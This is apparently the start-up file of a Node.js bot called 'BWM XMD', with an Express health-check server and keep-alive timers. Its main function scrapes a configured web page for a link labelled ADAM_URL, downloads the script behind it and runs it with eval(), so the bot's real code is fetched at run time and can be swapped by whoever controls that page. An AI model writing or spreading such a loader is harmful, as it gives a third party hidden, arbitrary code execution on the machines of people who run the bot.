//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//




const axios = require('axios');
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 8080;
const http = require('http');
const express = require('express');
const app = express();

// Basic health check endpoint
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Keep-alive ping every 5 minutes
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    console.log("Bot connection active");
  }
}, 300000);

// Add keep-alive ping to prevent premature scaling to zero
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    console.log("Bot is alive and connected");
  }
}, 45000);

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

fetchAdamsUrl();